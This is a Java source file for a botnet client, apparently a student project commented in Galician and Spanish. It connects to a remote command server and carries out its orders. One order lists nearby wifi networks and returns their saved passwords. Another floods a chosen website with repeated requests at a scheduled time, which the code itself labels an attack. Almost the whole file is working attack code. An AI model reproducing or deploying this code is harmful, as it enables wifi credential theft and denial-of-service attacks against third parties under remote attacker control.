import java.io.*;
import java.net.*;
import java.text.*;
import java.util.*;
import java.util.regex.Pattern;

public class Cliente {
	private static int identificador = 0;

	public static void main(String[] arg) throws IOException {
		InetAddress ipAddress = InetAddress.getByName(arg[0]);
		int conexPort = Integer.parseInt(arg[1]);
		Socket socketTCP = null;
		BufferedReader stdIn = null;
		InputStreamReader entradaTeclado = null;
		entradaTeclado = new InputStreamReader(System.in);
		stdIn = new BufferedReader(entradaTeclado);
		DataInputStream dis = null;
		DataOutputStream dos = null;
		try {
			socketTCP = new Socket(ipAddress, conexPort);
			try {
				dis = new DataInputStream(socketTCP.getInputStream());
				dos = new DataOutputStream(socketTCP.getOutputStream());
			} catch (Exception e) {
				e.printStackTrace();
				System.out.println("Error ao crear os fluxos de datos");
				System.exit(0);
			}
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("Error ao crear o socket");
			System.exit(0);
		}
		try {
			while (socketTCP.isConnected()) {
				String auxiliar = dis.readUTF();
				if (auxiliar.toLowerCase().equals("hellow")) {
					dos.writeUTF("Hellow");
				}else if(auxiliar.toLowerCase().contains("nbots")) {
					dos.writeUTF("nbots");
				} else if (auxiliar.toLowerCase().equals("obter wifis")) {
					dos.writeUTF("Respuesta:" + Faux.ObterWifi());
				} else if (auxiliar.toLowerCase().contains("obter contrasinal de ")) {
					String wifi = auxiliar.substring(20);
					dos.writeUTF("Respuesta:" + Faux.Obtercontrasinal(wifi));
				} else if (auxiliar.toLowerCase().contains("www.")) {
					String[] aux = auxiliar.split(Pattern.quote("**"));
					int bucle_infernal = 1;
					String web = aux[0];
					String fecha = "agora";
					long waitTime = 0;
					if (aux.length == 2) {
						bucle_infernal = Integer.parseInt(aux[1]);
					}
					if (aux.length == 3) {
						bucle_infernal = Integer.parseInt(aux[1]);
						fecha = aux[2];
						try {
							SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
							Date d1 = sdf.parse(fecha);
							Calendar cal = Calendar.getInstance();
							Calendar actual = Calendar.getInstance();
							cal.setTime(d1);
							long timeAttack = cal.getTimeInMillis();
							long actualTime = actual.getTimeInMillis();
							waitTime = timeAttack - actualTime;
							if (waitTime/1000 < 0) {
								waitTime = 0;
								fecha = "agora";
							}
						} catch (ParseException e) {
							fecha = "agora";
						}
					}
					dos.writeUTF("Entrando na paxina " + bucle_infernal + " veces, na data establecida: " + fecha);
					Thread.sleep(waitTime);
					Faux.AtaqueWeb(web, bucle_infernal);
				} else if (auxiliar.toLowerCase().contains("kill")) {
					dos.writeUTF("Muerto");
					dis.close();
					dos.close();
					socketTCP.close();
				} else {
					dos.writeUTF("Respuesta:" + " Non se reconoce a orden");
					System.out.println(auxiliar);
				}
			}
		} catch (Exception e) {
			System.out.println("Este bot foi expulsado da botnet");
			System.exit(0);
		} finally {
			try {
				dis.close();
				dos.close();
			} catch (IOException e) {
				System.out.println("Error ao cerrar sockets e/ou fluxo de datos");
			}
		}
	}
}
